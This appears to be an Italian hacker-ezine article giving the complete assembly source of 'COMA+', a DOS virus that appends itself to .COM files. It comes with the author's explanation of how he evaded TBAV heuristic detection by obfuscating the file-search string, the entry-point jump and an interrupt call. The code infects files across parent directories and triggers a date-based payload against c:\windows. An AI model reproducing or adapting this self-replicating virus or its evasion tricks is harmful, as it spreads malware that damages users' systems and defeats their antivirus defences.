; Sul numero zero di questa ezine ho pubblicato un semplice virus di
; appending per files .COM con un fit bassissimo, ma utile per far capire
; ai principianti le basi di questa nobile arte.
; COMA perï ä facilmente individuabile dagli antivirus euristici, quindi
; ecco COMA+, che fa le stesse cose, ma elimina qualche di flag dallo scan
; del TBAV.
; Per chi non lo sapesse il TBAV assegna dei flag ai file che scanna, ad
; esempio se un file contiene una procedura per ricercare dei file .EXE o
; dei file .COM gli assegna il flag S, se contiene una routine di criptazione
; gli assegnerÖ un altro flag, ora se questi flag superano un certo numero
; l'antivirus ä sicuro che quello ä un virus ä lo segnala come virus
; sconosciuto. Per rendere invisibile COMA+ al TBAV non ho dovuto eliminare
; tutti i flag ma solo tre.
;
; 1) S - Prima il mio virus conteneva la stringa *.COM che faceva capire
;        al TBAV che il programma ricercava dei file COM quindi ho scritto
;        ).com e al momento di usare la stringa aumento di 1 il valore del
;        primo carattere, ottenendo cosç di nuovo *.COM, ma in questo modo
;        il TBAV non mi riconosce pió il flag S
;
; 2) B - Per far eseguire al virus il vero programma, per non far nascere
;        sospetti, avevo scritto : MOV AX,100h seguito da JMP AX. In questo
;        modo saltava all'inizio del programma ma il bastardissimo TBAV
;        lo riconosceva... quindi ho cambiato con MOV AX,200h - SHR AX,1
;         - JMP AX, e cosç anche questo flag ä eliminato
;
; 3) U - La 'bomba' usa l'interrupt 21h con ah=71h. Questo viene riconosciuto
;    dal TBAV come un ulteriore indizio, quindi ho scritto prima in ah 11h,
;    e poi ho aggiunto 60h.                                                     
;
;
; Se ä settato a Auto Heuristic Sensitivity o Low Heuristic Sensitivity per
; fotterlo basta eliminare due di questi flags, se ä settato a High Heuristic
; Sensitivity allora bisogna eliminarli tutti e tre.
;
; Riconosce ancora 3 flag, ma sono troppo pochi e lo prende per un falso
; allarme, pur visualizzando i 3 flag dice cmq che il file ä pulito.
; bello no ?
;
;
;       Techno Knight  (techno83@freemail.it)



codice segment 'code'
org 100h
assume cs:codice,ds:codice,es:codice
start proc far
lunghezza equ fine-via   
via:
db 90h, 90h, 90h, 90h, 90h
QUA:
CALL NOFINE
CALL FINE2
NOFINE:
PUSH cs
PUSH cs
POP ds
POP es
CALL niente
niente:                 
POP  BP
SUB  BP, OFFSET niente   
LEA SI,BP+iniziale
MOV AH,47h
MOV DL,0
INT 21h                  
infetta:
MOV AH,4eh              
INC byte ptr[BP+OFFSET comfile]
LEA DX,BP+comfile
MOV CX,0000h
INT 21h
DEC byte ptr[BP+OFFSET comfile]
MOV AH,3dh
MOV AL,00000010b
MOV DX,009eh            
INT 21h
PUSH AX
POP BX                  
LEA DI,BP+iprimitretmp
LEA SI,BP+iprimitre
MOV CX,3
REP MOVSB           
MOV AH,3fh
MOV CX,3
LEA DX,BP+iprimitre 
INT 21h             
MOV AX,4200h    
MOV CX,0
MOV DX,0
INT 21h
MOV AH,40h
MOV CX,1
LEA DX,BP+jump
INT 21h         
LEA DI,BP+dimensione
MOV SI,009ah
MOV CX,4
REP MOVSB
MOV AH,40h
MOV CX,2
LEA DX,BP+dimensione
INT 21h         
MOV AX,4202h            
MOV CX,0
MOV DX,0
INT 21h
MOV AH,40h
MOV CX,lunghezza        
LEA DX,BP+via           
INT 21h                 
MOV AH,3Eh              
INT 21h                 
LEA SI,BP+iprimitretmp
LEA DI,BP+iprimitre
MOV CX,3
REP MOVSB           
MOV AH,2Ah
INT 21H
CMP DL,12
JE  bomba  
JMP nobomba
bomba:
MOV AX,11AAh
ADD AH,60h
MOV BH,0
MOV BL,1
LEA DX,BP+path1
INT 21h
nobomba:
LEA DX,BP+indietro
MOV AH,3Bh
INT 21h        
LEA SI,BP+vediamo
MOV AH,47h
MOV DL,0
INT 21h
LEA SI,BP+vediamo
LODSB
CMP AL,''
JE ORABASTA    
JMP infetta      
orabasta:
LEA DX,BP+iniziale 
MOV AH,3Bh
INT 21h
LEA SI,BP+iprimitre
MOV DI,100h        
MOV CX,3
REP MOVSB
LEA DI,BP+QUA
MOV AL,90h
MOV CX,3       
REP STOSB                                  
MOV AX,200h
SHR AX,1          ; Invece scrivendo MOV AX,100h direttamente il TBAV
JMP AX            ; gli assegna il flag B (back to entry point)
FINE2:
MOV AX,4C00h
INT 21h    
iniziale db 64 dup (?)
vediamo db 64 dup (?)
iprimitre db 3 dup (?)          
iprimitretmp db 3 dup(?)
dimensione dw 2 dup (?)
jump db 'È',0
comfile db ').COM',0   ; Scrivendo *.COM gli assegna il flag S               
messaggio db 'COMA+ - di Techno Knight'  
indietro db '..',0
path1 db 'c:\windows',0
path2 db 'a:\',0
fine:                                   
start endp
codice ends
end via        
